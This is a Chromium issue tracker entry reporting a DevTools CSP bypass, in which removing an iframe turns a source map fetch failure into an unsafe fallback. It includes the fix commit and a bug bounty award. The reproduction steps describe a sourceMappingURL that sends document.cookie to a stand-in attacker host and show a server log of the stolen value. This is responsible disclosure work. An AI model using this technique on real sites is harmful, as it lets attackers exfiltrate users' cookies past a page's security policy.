# CSP doesn't block sourceMappingURL

| Field | Value |
|-------|-------|
| **Issue ID** | [490773579](https://issues.chromium.org/issues/490773579) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Platform>DevTools>Sources |
| **Platforms** | Linux, ChromeOS |
| **Reporter** | no...@applitools.com |
| **Assignee** | da...@google.com |
| **Created** | 2026-03-08 |
| **Bounty** | $1,000.00 |

## Description

## VULNERABILITY DETAILS

### Summary

Following the decision made in [issue 361116749](https://issues.chromium.org/issues/361116749), `sourceMappingURL` requests should be blocked by the `connect-src` CSP directive.

However, this vulnerability allows an attacker to bypass CSP and send requests to their own server, even if the `connect-src` directive (or its fallback) forbids it.

### Bisect and Root Cause Analysis

The check at [PageResourceLoader.ts:344](https://source.chromium.org/chromium/chromium/src/+/main:third_party/devtools-frontend/src/front_end/core/sdk/PageResourceLoader.ts;l=344;drc=a718fd59205c847882992a8aec65f5e23ed93a7c) only prevents the fallback if `loadFromTarget` fails specifically with a `CSP violation` error:

```
      try {
        Host.userMetrics.developerResourceLoaded(Host.UserMetrics.DeveloperResourceLoaded.LOAD_THROUGH_PAGE_VIA_TARGET);
        const result = await this.loadFromTarget(initiator.target, initiator.frameId, url, isBinary);
        return result;
      } catch (e) {
        if (e instanceof Error) {
          Host.userMetrics.developerResourceLoaded(Host.UserMetrics.DeveloperResourceLoaded.LOAD_THROUGH_PAGE_FAILURE);
          if (e.message.includes('CSP violation')) {
            return {
              success: false,
              content: '',
              errorDescription: {
                statusCode: 0,
                message: e.message,
              }
            };
          }
        }
      }
      Host.userMetrics.developerResourceLoaded(Host.UserMetrics.DeveloperResourceLoaded.LOAD_THROUGH_PAGE_FALLBACK);

```

Because the source map fetch is asynchronous, if the target frame is removed before [`loadNetworkResource`](https://source.chromium.org/chromium/chromium/src/+/main:third_party/devtools-frontend/src/front_end/core/sdk/PageResourceLoader.ts;l=414;drc=a718fd59205c847882992a8aec65f5e23ed93a7c), `loadFromTarget` will fail with a different error: `Frame not found`. When this happens, the fallback mechanism is still triggered, successfully sending the request to the attacker's server.

The check for `e.message` was introduced in the following commit:

<https://source.chromium.org/chromium/_/chromium/devtools/devtools-frontend/+/5c8833cfccc90880d3dc648b64cc6786a48a2d0e>

### Attack Preconditions

The victim (most likely a developer) opens DevTools on a page controlled by the attacker via XSS

### Impact Analysis

I believe this carries the same impact and severity as [issue 361116749](https://issues.chromium.org/issues/361116749) (previous discussion regarding the impact can be found in [comment #3](https://issues.chromium.org/issues/361116749#comment3)). A remote attacker can abuse this vulnerability to bypass CSP and exfiltrate sensitive data to their server, despite restrictive `connect-src` or fallback directives.

Additionally, this behavior is completely silent; the user will not notice the request even if they check the DevTools Network panel.

## VERSION

Chrome Version: 145.0.7632.76 stable

Operating System: Linux, Mac, Windows

This vulnerability is also present in Chrome 147.0.7692.0 canary.

## REPRODUCTION CASE

1. Create a directory structure like this with the attached file:

```
.
└── index.html

```

2. Update your `/etc/hosts` file to resolve `cross-origin.test` to `127.0.0.1`. (Alternatively, change the `ATTACKER_URL` in `index.html` to your own server's URL.)
3. Start a local web server in the directory. For example, using Python:

```
python3 -m http.server 1337

```

4. Open `http://localhost:1337/` with DevTools opened.
5. `index.html` attempts to create an `iframe` using `srcdoc`, then uses `iframe.contentDocument.write` to inject a script tag with a `sourceMappingURL` pointing to `http://cross-origin.test:1337/exploit.map?c=${document.cookie}`. The iframe is removed immediately after the script tag is written. This ensures the iframe is removed and triggers the fallback mechanism with a `Frame not found` error instead of a `CSP violation`.
6. Even though `index.html`'s CSP: `default-src 'none'; script-src 'unsafe-inline';` does not allow `http://cross-origin.test:1337`, the source map request to `http://cross-origin.test:1337/exploit.map` will still be sent. The expected server log (using Python's `http.server`) should look like this:

```
$ python3 -m http.server 1337
Serving HTTP on :: port 1337 (http://[::]:1337/) ...
::1 - - [08/Mar/2026 17:02:21] "GET / HTTP/1.1" 200 -
::1 - - [08/Mar/2026 17:02:21] code 404, message File not found
::1 - - [08/Mar/2026 17:02:21] "GET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1" 404 -
::ffff:127.0.0.1 - - [08/Mar/2026 17:02:21] code 404, message File not found
::ffff:127.0.0.1 - - [08/Mar/2026 17:02:21] "GET /exploit.map?c=secret%3Dflag%7Bcredentials_that_attackers_want_to_steal%7D&t=1772960541600 HTTP/1.1" 404 -

```
## CREDIT INFORMATION

Reporter credit: lebr0nli of National Yang Ming Chiao Tung University, Dept. of CS, Security and Systems Lab.

## Attachments

- [index.html](attachments/index.html) (text/html, 1.7 KB)

## Timeline

### ch...@google.com (2026-03-10)

Setting Priority to P2 to match Severity s2. To ensure SLOs are tracked correctly, priority must match or exceed severity.

### jd...@chromium.org (2026-03-10)

Over to danilsomsikov@, the owner of the previous bug, to investigate.

### dx...@google.com (2026-03-11)

Project: devtools/devtools-frontend  

Branch:  main  

Author:  Danil Somsikov [dsv@chromium.org](mailto:dsv@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7656988>

Prevent CSP bypass in source map fetches via removed frames

---


Expand for full commit details
```
     
    Currently, DevTools only blocks its unsafe fallback mechanism for 
    source map requests if it receives a literal "CSP violation" error 
    from the target. An attacker can bypass this by triggering a fetch 
    from an injected iframe and immediately removing it. This causes the 
    primary load to fail with a "Frame not found" error, which 
    incorrectly triggers the fallback and bypasses the page's Content 
    Security Policy. 
     
    This CL addresses the issue by querying the frame's security posture 
    (via `Network.getSecurityIsolationStatus`) before initiating the fetch. 
    If a restrictive CSP (`connect-src` or `default-src`) is detected, 
    any failure from the target load is treated as a terminal security 
    failure, preventing the unsafe fallback mechanism from executing. 
     
    Bug: 490773579 
    Change-Id: I7293ba2f112a9cd4ab765dce6de8439afbb0f1b5 
    Reviewed-on: https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/7656988 
    Commit-Queue: Simon Zünd <szuend@chromium.org> 
    Auto-Submit: Danil Somsikov <dsv@chromium.org> 
    Commit-Queue: Danil Somsikov <dsv@chromium.org> 
    Reviewed-by: Simon Zünd <szuend@chromium.org>

```

---

Files:

- M `front_end/core/sdk/PageResourceLoader.test.ts`
- M `front_end/core/sdk/PageResourceLoader.ts`

---

Hash: [94bfd04bf58c052951ae7a834b6f42df7338ca5a](https://chromiumdash.appspot.com/commit/94bfd04bf58c052951ae7a834b6f42df7338ca5a)  

Date: Wed Mar 11 15:56:45 2026


---

### dx...@google.com (2026-03-11)

Project: chromium/src  

Branch:  main  

Author:  chromium-autoroll [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/7659183>

Roll DevTools Frontend from b2a86d09d5c4 to 48f965098f72 (6 revisions)

---


Expand for full commit details
```
     
    https://chromium.googlesource.com/devtools/devtools-frontend.git/+log/b2a86d09d5c4..48f965098f72 
     
    2026-03-11 dsv@chromium.org Record metrics for extension evaluation targets. 
    2026-03-11 finnur@chromium.org [GreenDev-Sim]: The GreenDev simulation prototype. 
    2026-03-11 dsv@chromium.org Fix TypeError when passing class constructors to Lit templates 
    2026-03-11 helmut@januschka.com Reduce cache storage entry list min-height for small screens 
    2026-03-11 dsv@chromium.org Prevent CSP bypass in source map fetches via removed frames 
    2026-03-11 nvitkov@chromium.org Add test for Setting Version Control 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/devtools-frontend-chromium 
    Please CC chrome-devtools-staff+oncall-change@google.com,liviurau@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Bug: chromium:375959766,chromium:41487354,chromium:490773579,chromium:491079281 
    Change-Id: I77a552ffc418e19fb25fb5a07e4ea7a6411bc870 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7659183 
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1598077}

```

---

Files:

- M `DEPS`
- M `third_party/devtools-frontend/src`

---

Hash: [e79cd82f4946c955209680b3d5932d30bb1ac167](https://chromiumdash.appspot.com/commit/e79cd82f4946c955209680b3d5932d30bb1ac167)  

Date: Wed Mar 11 23:49:50 2026


---

### ch...@google.com (2026-03-12)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### sp...@google.com (2026-05-18)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $1500.00 for this report.

Rationale for this decision:
borderline (CSP exfiltration), very low impact, + bisect


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-06-19)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/490773579)*
